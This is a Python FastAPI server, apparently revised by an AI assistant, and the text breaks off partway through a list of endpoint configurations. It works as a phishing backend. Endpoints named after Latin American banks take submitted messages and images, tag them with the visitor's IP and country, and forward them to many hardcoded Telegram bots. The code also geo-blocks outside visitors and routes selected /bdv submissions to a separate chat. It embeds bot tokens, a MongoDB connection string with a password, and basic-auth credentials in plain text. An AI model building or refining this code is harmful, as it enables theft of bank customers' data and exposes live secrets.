# Write the revised FastAPI app to a file so the user can download it.

import os
import io
import re
import time
import json
import base64
import random
import asyncio
import logging
import tempfile
from copy import deepcopy
from collections import deque, defaultdict
import xml.etree.ElementTree as ET

from contextlib import asynccontextmanager
from datetime import datetime, timedelta
from functools import lru_cache, partial
from typing import Callable, Dict, Optional, Set, Tuple, Any
import httpx
from fastapi import (
    FastAPI, HTTPException, Request, UploadFile, BackgroundTasks,
    File, Form
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from motor.motor_asyncio import AsyncIOMotorClient
from PIL import Image
from pydantic import BaseModel, Field
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
from asyncio import Semaphore, Queue
from fastapi import Body


REGCHECK_BASE = "https://www.placaapi.co/api/reg.asmx"
REGCHECK_USER_DEFAULT = "havka11"  # valor inicial; editable vía endpoint


# =========================
# Logging
# =========================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# =========================
# Config (usar varsiables de entorno)
# =========================
TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
DEFAULT_CHAT_ID = "-4826186479"

AUTH_USERNAME = "gato"
AUTH_PASSWORD = "Gato1234@"

MONGO_URI = "mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd"

# Países de Latinoamérica permitidos
PAISES_LATINOAMERICA: Set[str] = frozenset({
    'AR', 'BO', 'BR', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV',
    'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'UY', 'VE', 'PR',
    'GF', 'GY', 'SR', 'BZ', 'JM', 'HT', 'TT', 'BB', 'GD', 'LC',
    'VC', 'DM', 'AG', 'KN', 'BS', 'FR', 'US'
})

# IPs excluidas de la verificación geográfica
EXCLUDED_IPS = frozenset({
    "190.232.27.117",  # tu IP
    "127.0.0.1",       # localhost v4
    "::1",             # localhost v6
    "0.0.0.0",
    "localhost",
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
})

# =========================
# Concurrency / Timeouts
# =========================
CACHE_TTL = 300  # 5 min
MAX_CONCURRENT_REQUESTS = 100
MAX_DB_CONNECTIONS = 20
MAX_HTTP_CONNECTIONS = 50
REQUEST_TIMEOUT = 30

# Telegram limits
MAX_TELEGRAM_CONCURRENT = 20
MAX_TELEGRAM_QUEUE_SIZE = 1000
TELEGRAM_TIMEOUT = 10.0
TELEGRAM_RETRY_DELAY = 0.5
MAX_TELEGRAM_RETRIES = 2
RATE_LIMIT_MESSAGES_PER_MINUTE = 30
RATE_LIMIT_MESSAGES_PER_SECOND = 1  # 1/s

CACHE_TTL_SECONDS = 300          # 5 min de TTL por placa (ajústalo)
CACHE_MAX_SIZE = 5000            # tamaño máx del cache (simple LRU-approx)
HTTP_TIMEOUT = 15                # segundos
HTTP_RETRIES = 3                 # reintentos
HTTP_BACKOFF_BASE = 0.25         # segundos, exponencial


# Semáforos
request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
telegram_semaphore = Semaphore(MAX_TELEGRAM_CONCURRENT)

# Colas
background_queue: Queue = Queue(maxsize=1000)
telegram_queue: Queue = Queue(maxsize=MAX_TELEGRAM_QUEUE_SIZE)

# Rate-limit tracking
bot_rate_limits = defaultdict(lambda: {"messages": [], "last_second": 0})
telegram_stats = {
    "sent_immediate": 0,
    "sent_queued": 0,
    "failed": 0,
    "queue_full": 0,
    "rate_limited": 0,
    "total_processed": 0
}

# =========================
# Estado global / Cachés
# =========================
ip_cache: Dict[str, Tuple[Tuple[bool, str], float]] = {}
blocked_ips_cache: Set[str] = set()
user_cache: Dict[str, int] = {}
ip_number_cache: Dict[str, int] = {}

cola = deque(maxlen=100)     # tracking de IPs recientes
baneado = deque(maxlen=200)  # IPs baneadas (mem temporal)
numeros_r = frozenset({4, 6, 9})
iprandom = frozenset({4, 6, 9})

variable = False
is_active_cache = False
cache_last_updated = 0.0

# =========================
# FastAPI app + HTTP client + DB
# =========================
client: AsyncIOMotorClient
db = None
ip_numbers = None
user_numbers = None
global_settings = None
logs_usuarios = None
ip_bloqueadas = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    app.state.regcheck_user = REGCHECK_USER_DEFAULT
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(
            max_keepalive_connections=MAX_HTTP_CONNECTIONS,
            max_connections=MAX_HTTP_CONNECTIONS * 2,
            keepalive_expiry=30.0
        ),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )

    app.state.regcheck_user = REGCHECK_USER_DEFAULT

    # http client persistente
    app.state.http = httpx.AsyncClient(
        timeout=HTTP_TIMEOUT,
        headers={"Connection": "keep-alive"},
    )

    # cache (placa -> {"expires": datetime, "data": dict})
    app.state.cache: Dict[str, Dict[str, Any]] = {}
    # orden aproximado para recorte LRU
    app.state.cache_order: asyncio.Queue[str] = asyncio.Queue()

    # deduplicación de solicitudes concurrentes (placa -> Future)
    app.state.inflight: Dict[str, asyncio.Future] = {}

    # locks
    app.state.cache_lock = asyncio.Lock()
    app.state.inflight_lock = asyncio.Lock()
    app.state.user_lock = asyncio.Lock()
    global client, db, ip_numbers, user_numbers, global_settings, logs_usuarios, ip_bloqueadas
    client = AsyncIOMotorClient(
        MONGO_URI,
        maxPoolSize=MAX_DB_CONNECTIONS,
        minPoolSize=5,
        maxIdleTimeMS=30000,
        serverSelectionTimeoutMS=5000,
        socketTimeoutMS=5000,
        connectTimeoutMS=5000,
        waitQueueTimeoutMS=5000,
        maxConnecting=10
    )
    db = client["api_db"]
    ip_numbers = db["ip_numbers"]
    user_numbers = db["user_numbers"]
    global_settings = db["global_settings"]
    logs_usuarios = db["logs_usuarios"]
    ip_bloqueadas = db["ip_bloqueadas"]

    await init_db_async()
    await load_caches()

    # workers
    app.state.background_task = asyncio.create_task(background_worker())
    app.state.telegram_workers = []
    for i in range(5):
        app.state.telegram_workers.append(asyncio.create_task(telegram_worker(i)))
    logger.info("Aplicación iniciada con 5 workers de Telegram.")

    yield

    # Shutdown
    logger.info("Cerrando aplicación...")
    await background_queue.put(None)
    for _ in range(len(app.state.telegram_workers)):
        await telegram_queue.put(None)

    try:
        await asyncio.wait_for(app.state.background_task, timeout=10.0)
    except asyncio.TimeoutError:
        logger.warning("Background worker no terminó a tiempo.")

    try:
        await asyncio.gather(*app.state.telegram_workers, return_exceptions=True)
    except Exception:
        pass

    await app.state.http_client.aclose()

app = FastAPI(lifespan=lifespan)
# Acepta ambos (con y sin slash) pero muestra SOLO UNO en /docs
app.router.redirect_slashes = True

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    max_age=3600,
)

# =========================
# Utilidades
# =========================
async def add_background_task(func, *args, **kwargs):
    try:
        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
    except asyncio.TimeoutError:
        logger.warning("Queue de background lleno, tarea descartada.")

def contar_elemento_optimized(dq: deque, elemento: str) -> int:
    return sum(1 for x in dq if x == elemento)

def obtener_ip_real(request: Request) -> str:
    headers_to_check = ["x-forwarded-for", "x-real-ip", "cf-connecting-ip", "x-client-ip"]
    for header in headers_to_check:
        value = request.headers.get(header)
        if value:
            ip = value.split(",")[0].strip()
            if ip:
                if ":" in ip and not ip.startswith("["):
                    ip = ip.split(":")[0]
                return ip
    client_ip = request.client.host
    if client_ip and ":" in client_ip and not client_ip.startswith("["):
        client_ip = client_ip.split(":")[0]
    return client_ip

# =========================
# DB & Cachés
# =========================
async def init_db_async():
    async with db_semaphore:
        try:
            tasks = [
                asyncio.wait_for(ip_numbers.create_index("ip", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(user_numbers.create_index("username", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(global_settings.create_index("id", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(ip_bloqueadas.create_index("ip", background=True), timeout=10.0)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            if not await global_settings.find_one({"id": 1}):
                await global_settings.insert_one({"id": 1, "is_active": False})
            logger.info("BD inicializada.")
        except Exception as e:
            logger.error(f"Error inicializando BD: {e}")

async def load_caches():
    global blocked_ips_cache, is_active_cache, cache_last_updated
    async with db_semaphore:
        try:
            blocked_ips_cache = {doc["ip"] async for doc in ip_bloqueadas.find({}, {"ip": 1})}
            settings = await global_settings.find_one({"id": 1})
            is_active_cache = settings.get("is_active", False) if settings else False

            async for doc in ip_numbers.find({}, {"ip": 1, "number": 1}).limit(2000):
                ip_number_cache[doc["ip"]] = doc["number"]

            async for doc in user_numbers.find({}, {"username": 1, "number": 1}).limit(2000):
                user_cache[doc["username"]] = doc["number"]

            cache_last_updated = time.time()
            logger.info(
                f"Caches cargados: "
                f"{len(blocked_ips_cache)} IPs bloqueadas, "
                f"{len(ip_number_cache)} IPs, {len(user_cache)} usuarios"
            )
        except Exception as e:
            logger.error(f"Error cargando caches: {e}")

def agregar_elemento_diccionario_cache(ip: str, numero: int):
    if len(ip_number_cache) > 10000:
        for key in list(ip_number_cache.keys())[:1000]:
            ip_number_cache.pop(key, None)
    ip_number_cache[ip] = numero

async def agregar_elemento_diccionario_async(ip: str, numero: int):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_numbers.insert_one({"ip": ip, "number": numero}), timeout=5.0)
            agregar_elemento_diccionario_cache(ip, numero)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando IP {ip}")
        except Exception as e:
            logger.error(f"Error guardando IP en BD: {e}")

def obtener_numero_cached(ip: str) -> Optional[int]:
    return ip_number_cache.get(ip)

def obtener_usuario_cached(usuario: str) -> Optional[int]:
    return user_cache.get(usuario)

async def refresh_is_active_cache():
    global is_active_cache, cache_last_updated
    async with db_semaphore:
        try:
            doc = await asyncio.wait_for(global_settings.find_one({"id": 1}), timeout=3.0)
            is_active_cache = bool(doc["is_active"]) if doc else False
            cache_last_updated = time.time()
        except asyncio.TimeoutError:
            logger.warning("Timeout actualizando is_active")
        except Exception as e:
            logger.error(f"Error actualizando is_active: {e}")

def obtener_is_active_cached() -> bool:
    global cache_last_updated, is_active_cache
    if time.time() - cache_last_updated > 60:
        asyncio.create_task(refresh_is_active_cache())
    return is_active_cache

# =========================
# Geo IP
# =========================
async def verificar_pais_cached(ip: str) -> Tuple[bool, str]:
    if ip in EXCLUDED_IPS:
        return True, "EXCLUDED"

    now = time.time()
    if ip in ip_cache:
        cached_result, t = ip_cache[ip]
        if now - t < CACHE_TTL:
            return cached_result

    apis = [
        {
            "url": f"http://ip-api.com/json/{ip}?fields=status,country,countryCode",
            "country_field": "countryCode",
            "success_field": "status",
            "success_value": "success",
            "timeout": 3.0,
            "name": "ip-api.com"
        },
        {
            "url": f"https://ipapi.co/{ip}/json/",
            "country_field": "country_code",
            "success_field": None,
            "success_value": None,
            "timeout": 3.0,
            "name": "ipapi.co"
        },
        {
            "url": f"https://freeipapi.com/api/json/{ip}",
            "country_field": "countryCode",
            "success_field": None,
            "success_value": None,
            "timeout": 3.0,
            "name": "freeipapi.com"
        },
        {
            "url": f"https://ipinfo.io/{ip}/json",
            "country_field": "country",
            "success_field": None,
            "success_value": None,
            "timeout": 3.0,
            "name": "ipinfo.io"
        }
    ]

    async with http_semaphore:
        for api in apis:
            try:
                resp = await asyncio.wait_for(app.state.http_client.get(api["url"]), timeout=api["timeout"])
                if resp.status_code == 200:
                    data = resp.json()
                    if api["success_field"]:
                        if data.get(api["success_field"]) != api["success_value"]:
                            continue
                    country = data.get(api["country_field"], 'Unknown')
                    if not country or country == 'Unknown':
                        continue

                    result = (True, country) if country in PAISES_LATINOAMERICA else (False, country)

                    if len(ip_cache) > 5000:
                        old = [k for k, (_, t) in ip_cache.items() if now - t > CACHE_TTL * 2]
                        for k in old[:1000]:
                            ip_cache.pop(k, None)
                    ip_cache[ip] = (result, now)
                    return result
            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

    logger.warning(f"No se pudo geolocalizar IP {ip}")
    return False, 'Unknown'

# =========================
# Validaciones
# =========================
@lru_cache(maxsize=2000)
def validar_contrasena_cached(contrasena: str) -> bool:
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    return bool(re.match(patron, contrasena))

# =========================
# Telegram
# =========================
class TelegramMessage:
    def __init__(
        self,
        mensaje: str,
        chat_id: str,
        token: str,
        priority: int = 1,
        max_retries: int = MAX_TELEGRAM_RETRIES,
        image_data: Optional[bytes] = None,
        image_filename: Optional[str] = None
    ):
        self.mensaje = mensaje
        self.chat_id = chat_id
        self.token = token
        self.priority = priority
        self.max_retries = max_retries
        self.attempts = 0
        self.created_at = time.time()
        self.image_data = image_data
        self.image_filename = image_filename or "image.jpg"
        self.has_image = image_data is not None

def process_image_data(image_data: bytes, max_size: tuple = (1920, 1080), quality: int = 85) -> bytes:
    try:
        img = Image.open(io.BytesIO(image_data))
        if img.mode in ('RGBA', 'LA', 'P'):
            bg = Image.new('RGB', img.size, (255, 255, 255))
            if img.mode == 'P':
                img = img.convert('RGBA')
            bg.paste(img, mask=img.split()[-1] if img.mode == 'RGBA' else None)
            img = bg
        elif img.mode != 'RGB':
            img = img.convert('RGB')

        if img.size[0] > max_size[0] or img.size[1] > max_size[1]:
            img.thumbnail(max_size, Image.Resampling.LANCZOS)

        out = io.BytesIO()
        img.save(out, format='JPEG', quality=quality, optimize=True)
        return out.getvalue()
    except Exception as e:
        logger.error(f"Error procesando imagen: {e}")
        return image_data

def check_rate_limit(token: str) -> bool:
    now = time.time()
    sec = int(now)
    info = bot_rate_limits[token]
    info["messages"] = [ts for ts in info["messages"] if ts > now - 60]
    if len(info["messages"]) >= RATE_LIMIT_MESSAGES_PER_MINUTE:
        return False
    if info["last_second"] == sec:
        return False
    return True

def record_message_sent(token: str):
    now = time.time()
    info = bot_rate_limits[token]
    info["messages"].append(now)
    info["last_second"] = int(now)

async def _enviar_telegram_optimizado(m: TelegramMessage) -> bool:
    async with telegram_semaphore:
        for intento in range(m.max_retries + 1):
            try:
                if not check_rate_limit(m.token):
                    if intento == 0:
                        telegram_stats["rate_limited"] += 1
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue

                if m.has_image:
                    url = f"https://api.telegram.org/bot{m.token}/sendPhoto"
                    processed = process_image_data(m.image_data)
                    with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
                        tmp.write(processed)
                        path = tmp.name
                    try:
                        files = {'photo': (m.image_filename, open(path, 'rb'), 'image/jpeg')}
                        data = {'chat_id': m.chat_id, 'caption': m.mensaje[:1024]}
                        resp = await asyncio.wait_for(
                            app.state.http_client.post(url, files=files, data=data),
                            timeout=TELEGRAM_TIMEOUT * 2
                        )
                        files['photo'][1].close()
                    finally:
                        try:
                            os.unlink(path)
                        except Exception:
                            pass
                else:
                    url = f"https://api.telegram.org/bot{m.token}/sendMessage"
                    payload = {"chat_id": m.chat_id, "text": m.mensaje[:4000]}
                    resp = await asyncio.wait_for(
                        app.state.http_client.post(url, json=payload),
                        timeout=TELEGRAM_TIMEOUT
                    )

                if resp.status_code == 200:
                    record_message_sent(m.token)
                    return True
                elif resp.status_code == 429:
                    retry_after = int(resp.headers.get('Retry-After', 1))
                    await asyncio.sleep(min(retry_after, 10))
                    continue
                else:
                    logger.warning(f"Telegram HTTP {resp.status_code}: {resp.text}")
                    if intento < m.max_retries:
                        await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                        continue
            except asyncio.TimeoutError:
                logger.warning(f"Timeout Telegram (intento {intento+1})")
                if intento < m.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue
            except Exception as e:
                logger.error(f"Error Telegram (intento {intento+1}): {e}")
                if intento < m.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue
        return False

async def enviar_telegram_hibrido(
    mensaje: str,
    chat_id: str = DEFAULT_CHAT_ID,
    token: str = TOKEN,
    priority: int = 1,
    force_immediate: bool = False,
    image_data: Optional[bytes] = None,
    image_filename: Optional[str] = None
) -> dict:
    msg = TelegramMessage(
        mensaje, chat_id, token, priority,
        image_data=image_data,
        image_filename=image_filename
    )

    if force_immediate or (telegram_semaphore._value > 5 and telegram_queue.qsize() < 50):
        if check_rate_limit(token):
            try:
                timeout = TELEGRAM_TIMEOUT * 3 if msg.has_image else TELEGRAM_TIMEOUT + 2.0
                success = await asyncio.wait_for(_enviar_telegram_optimizado(msg), timeout=timeout)
                if success:
                    telegram_stats["sent_immediate"] += 1
                    telegram_stats["total_processed"] += 1
                    return {"status": "sent_immediate", "success": True, "method": "direct", "has_image": msg.has_image}
            except asyncio.TimeoutError:
                logger.warning("Timeout envío inmediato; se encola.")
            except Exception as e:
                logger.error(f"Error inmediato: {e}")

    try:
        telegram_queue.put_nowait(msg)
        return {
            "status": "queued", "success": True, "method": "queue",
            "queue_size": telegram_queue.qsize(), "has_image": msg.has_image
        }
    except asyncio.QueueFull:
        telegram_stats["queue_full"] += 1
        logger.error("Cola Telegram llena, descartado")
        return {"status": "queue_full", "success": False, "method": "none", "has_image": msg.has_image}

# =========================
# Workers
# =========================
async def background_worker():
    while True:
        try:
            task = await background_queue.get()
            if task is None:
                break
            func, args, kwargs = task
            try:
                if asyncio.iscoroutinefunction(func):
                    await func(*args, **kwargs)
                else:
                    func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error en background worker: {e}")
            background_queue.task_done()
        except Exception as e:
            logger.error(f"Loop background: {e}")
            await asyncio.sleep(1)

async def telegram_worker(worker_id: int):
    logger.info(f"Telegram worker {worker_id} iniciado")
    while True:
        try:
            msg = await asyncio.wait_for(telegram_queue.get(), timeout=5.0)
            if msg is None:
                logger.info(f"Telegram worker {worker_id} stop")
                break
            success = await _enviar_telegram_optimizado(msg)
            if success:
                telegram_stats["sent_queued"] += 1
                telegram_stats["total_processed"] += 1
            else:
                telegram_stats["failed"] += 1
            telegram_queue.task_done()
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            logger.error(f"Worker {worker_id} error: {e}")
            await asyncio.sleep(1)

# =========================
# Middlewares
# =========================
class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        try:
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    return await call_next(request)
        except asyncio.TimeoutError:
            logger.warning(f"Request timeout: {request.url.path}")
            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado, intenta más tarde"})
        except Exception as e:
            logger.error(f"Error Concurrency middleware: {e}")
            return JSONResponse(status_code=500, content={"detail": "Error interno del servidor"})

class FastBasicAuthMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, username: str, password: str):
        super().__init__(app)
        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()

    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith(("/docs", "/redoc")):
            auth = request.headers.get("Authorization")
            if not auth or not auth.endswith(self.auth_string):
                return Response("Unauthorized", status_code=401, headers={"WWW-Authenticate": "Basic"})
        return await call_next(request)

class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = obtener_ip_real(request)

        if client_ip in blocked_ips_cache:
            return JSONResponse(status_code=403, content={"detail": f"Acceso denegado, IP bloqueada {client_ip}"})

        excluded_paths = {"/docs", "/redoc", "/health", "/metrics", "/login"}

        if request.url.path not in excluded_paths and client_ip not in EXCLUDED_IPS:
            try:
                permitido, pais = await asyncio.wait_for(verificar_pais_cached(client_ip), timeout=8.0)
                if not permitido:
                    logger.info(f"IP {client_ip} bloqueada por geolocalización ({pais})")
                    return JSONResponse(status_code=403, content={"detail": "Acceso denegado", "ip": client_ip, "country": pais})
            except asyncio.TimeoutError:
                logger.warning(f"Timeout geolocalización {client_ip}")
                pass
            except Exception as e:
                logger.error(f"Geo error: {e}")
        else:
            if client_ip in EXCLUDED_IPS:
                logger.info(f"IP {client_ip} excluida del geo-check")

        if client_ip not in iprandom and client_ip not in ip_number_cache:
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario_cache(client_ip, numero_random)
            await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)

        return await call_next(request)

app.add_middleware(ConcurrencyLimitMiddleware)
app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
app.add_middleware(OptimizedIPBlockMiddleware)

# =========================
# Helpers de imagen base64 (para endpoints que acepten base64 si lo necesitas)
# =========================
def decode_base64_image(base64_string: str) -> bytes:
    if not base64_string or not base64_string.strip():
        raise ValueError("String base64 vacío")
    try:
        s = base64_string.strip()
        if s.startswith('data:image'):
            comma = s.find(',')
            if comma != -1:
                s = s[comma + 1:]
        data = base64.b64decode(s)
        if len(data) < 100:
            raise ValueError("Imagen demasiado pequeña")
        img = Image.open(io.BytesIO(data))
        img.verify()
        return data
    except Exception as e:
        logger.error(f"Error decodificando imagen base64: {e}")
        raise ValueError(f"Imagen base64 inválida: {e}")


PATHS_DOBLE_ENVIO = {
    "/lafise2", "/hotma1", "/hotma2", "/hotma3", 
    "/wts1", "/wts2", "/wts3"
}
PATHS_SIN_VALIDACION = {"/victovivienda"  }

# =========================
# Endpoints dinámicos (MULTIPART en /docs, imagen OPCIONAL)
# =========================
async def handle_dynamic_endpoint_optimized_with_image(
    config: dict,
    request: Request,
    mensaje: str,
    image_data: Optional[bytes],
    image_filename: Optional[str]
):
    """
    Handler principal para endpoints dinámicos.
    - Acepta 'mensaje' (str) y 'image_data' opcional (bytes) ya validados.
    - Envia texto e imagen a AMBOS Telegram según configuración del endpoint.
    - Mantiene geofiltro.
    """
    client_ip = obtener_ip_real(request)
    path = config["path"]
    
    # VERIFICAR SI ES UN PATH SIN VALIDACIÓN (envío directo)
    if any(path.startswith(p) for p in PATHS_SIN_VALIDACION):
        mensaje_completo = f"{mensaje} - IP: {client_ip} - {path}"
        if image_data:
            mensaje_completo += f" [IMAGEN: {image_filename or 'image.jpg'}]"
        
        telegram_results = []
        
        # ENVÍO 1: Chat específico del endpoint
        try:
            r1 = await enviar_telegram_hibrido(
                mensaje_completo,
                chat_id=config["chat_id"],
                token=config["bot_id"],
                priority=1,
                image_data=image_data,
                image_filename=image_filename
            )
            telegram_results.append(r1)
        except Exception as e:
            logger.error(f"Error enviando a chat específico: {e}")
            telegram_results.append({"success": False, "error": str(e)})

        # ENVÍO 2: DEFAULT_CHAT_ID
        try:
            r2 = await enviar_telegram_hibrido(
                mensaje_completo,
                chat_id=DEFAULT_CHAT_ID,
                token=TOKEN,
                priority=1,
                image_data=image_data,
                image_filename=image_filename
            )
            telegram_results.append(r2)
        except Exception as e:
            logger.error(f"Error enviando a DEFAULT_CHAT_ID: {e}")
            telegram_results.append({"success": False, "error": str(e)})
        
        ok = sum(1 for r in telegram_results if r.get("success")) > 0
        return {
            "mensaje_enviado": ok,
            "pais_origen": "Sin validación",
            "ip": client_ip,
            "telegram_results": telegram_results,
            "successful_sends": sum(1 for r in telegram_results if r.get("success")),
            "total_attempts": len(telegram_results),
            "image_sent": image_data is not None,
            "image_filename": image_filename,
            "direct_send": True,
            "both_telegrams_sent": len([r for r in telegram_results if r.get("success")]) == 2
        }
    
    # Continuar con validaciones normales para otros paths
    cola.append(client_ip)
    numeror = obtener_numero_cached(client_ip)

    if contar_elemento_optimized(cola, client_ip) > 8 and client_ip != "190.232.27.117":
        baneado.append(client_ip)
        raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")

    try:
        permitido, pais = await asyncio.wait_for(verificar_pais_cached(client_ip), timeout=10.0)
    except asyncio.TimeoutError:
        logger.warning(f"Timeout verificando país {client_ip}")
        raise HTTPException(status_code=503, detail="Servicio temporalmente no disponible")

    if permitido and (pais in PAISES_LATINOAMERICA or pais == "EXCLUDED"):
        mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
        if image_data:
            mensaje_completo += f" [IMAGEN: {image_filename or 'image.jpg'}]"

        telegram_results = []

        try:
            if path.startswith("/internacional") and pais not in {"EC", "EXCLUDED"}:
                return {"mensaje_enviado": True, "pais_origen": "Aburrete"}

            if path.startswith("/bdv") and obtener_is_active_cached() and \
               numeror in numeros_r and pais not in {"US", "CO"}:
                r = await enviar_telegram_hibrido(
                    mensaje_completo + " Todo tuyo",
                    chat_id="-4931572577",
                    token=TOKEN,
                    priority=2,
                    force_immediate=True,
                    image_data=image_data,
                    image_filename=image_filename
                )
                telegram_results.append(r)
            elif path.startswith("/maikel"):
                # Envía al DEFAULT_CHAT_ID con imagen
                r1 = await enviar_telegram_hibrido(
                    mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
                    image_data=image_data, image_filename=image_filename
                )
                telegram_results.append(r1)
                # Envía al chat específico también con imagen
                r2 = await enviar_telegram_hibrido(
                    mensaje, config["chat_id"], config["bot_id"], 1,
                    image_data=image_data, image_filename=image_filename
                )
                telegram_results.append(r2)
            elif any(path.startswith(p) for p in PATHS_DOBLE_ENVIO):
                # TODOS los paths especificados: lafise2, hotma1-3, wts1-3
                # Envía al DEFAULT_CHAT_ID con imagen
                r1 = await enviar_telegram_hibrido(
                    mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
                    image_data=image_data, image_filename=image_filename
                )
                telegram_results.append(r1)
                # Envía al chat específico también con imagen
                r2 = await enviar_telegram_hibrido(
                    mensaje_completo, config["chat_id"], config["bot_id"], 1,
                    image_data=image_data, image_filename=image_filename
                )
                telegram_results.append(r2)
            else:
                # TODOS LOS DEMÁS ENDPOINTS - Envía imagen a AMBOS
                # Envía al DEFAULT_CHAT_ID con imagen
                r1 = await enviar_telegram_hibrido(
                    mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
                    image_data=image_data, image_filename=image_filename
                )
                telegram_results.append(r1)
                # Envía al chat específico también con imagen
                r2 = await enviar_telegram_hibrido(
                    mensaje, config["chat_id"], config["bot_id"], 1,
                    image_data=image_data, image_filename=image_filename
                )
                telegram_results.append(r2)

            ok = sum(1 for r in telegram_results if r.get("success")) > 0
            return {
                "mensaje_enviado": ok,
                "pais_origen": pais,
                "ip": client_ip,
                "telegram_results": telegram_results,
                "successful_sends": sum(1 for r in telegram_results if r.get("success")),
                "total_attempts": len(telegram_results),
                "image_sent": image_data is not None,
                "image_filename": image_filename,
                "both_telegrams_sent": len(telegram_results) >= 2
            }
        except Exception as e:
            logger.error(f"Error Telegram: {e}")
            return {
                "mensaje_enviado": False,
                "pais_origen": pais,
                "ip": client_ip,
                "telegram_error": str(e),
                "image_sent": image_data is not None
            }
    else:
        raise HTTPException(status_code=403, detail="Acceso denegado")
endpoint_configs = [
    {"path": "/balza1/", "chat_id": "-4807047115", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/balza2/", "chat_id": "-4957332815", "bot_id": "8051878604:AAG-Uy5xQyBtYRAXnWbEHgSJaxJw69UvAHQ"},
    {"path": "/bct/", "chat_id": "7098816483", "bot_id": "8214397313:AAEkkZm2J3MwVpYRHZ3HkeA2B55owXJo5UE"},
    {"path": "/wtss/", "chat_id": "-4640738781", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
    {"path": "/hotvic1/", "chat_id": "7224742938", "bot_id": "8035901355:AAE6dWzFC-uRX9yp-ClQfN4Cqw6GanZX4go"},
    {"path": "/hotvic2/", "chat_id": "7805311838", "bot_id": "8096947754:AAGqBTQ6h5km50M04VWkEL9_Wwrjjzd-j3U"},
    {"path": "/msjd/", "chat_id": "-4916071646", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
    {"path": "/pelon/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/hermano/", "chat_id": "7805311838", "bot_id": "8096947754:AAGqBTQ6h5km50M04VWkEL9_Wwrjjzd-j3U"},
    {"path": "/vic/", "chat_id": "7224742938", "bot_id": "8035901355:AAE6dWzFC-uRX9yp-ClQfN4Cqw6GanZX4go"},
    {"path": "/maikel/", "chat_id": "-4809216697", "bot_id": "7766635171:AAGqZb9L9Fgt8ZNEgK1LX9Da8GSPFaDf3rU"},
    {"path": "/maikelwtsp/", "chat_id": "-4907721922", "bot_id": "7766635171:AAGqZb9L9Fgt8ZNEgK1LX9Da8GSPFaDf3rU"},
    {"path": "/fincomercio/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
    {"path": "/rid/", "chat_id": "-4214419442", "bot_id": "7385190699:AAGr-k9PkpBL8y6UXvR8_VDuQirBPT4sNBc"},
    {"path": "/bdh/", "chat_id": "7224742938", "bot_id": "8469107867:AAEp-Tav4fSja0rKgDdfxKi7eZUSZCw-G1g"},
    {"path": "/vic2/", "chat_id": "7661895844", "bot_id": "8435630717:AAHCgkoj2ylADK6pOjAc3eHKjFbbyVrX2K8"},
    {"path": "/balzawts/", "chat_id": "-4900230592", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
    {"path": "/lafsi/", "chat_id": "-4180268127", "bot_id": "6033097644:AAGO6cQJxDs8eLRut8VptH__xq29OHAmJdU"},
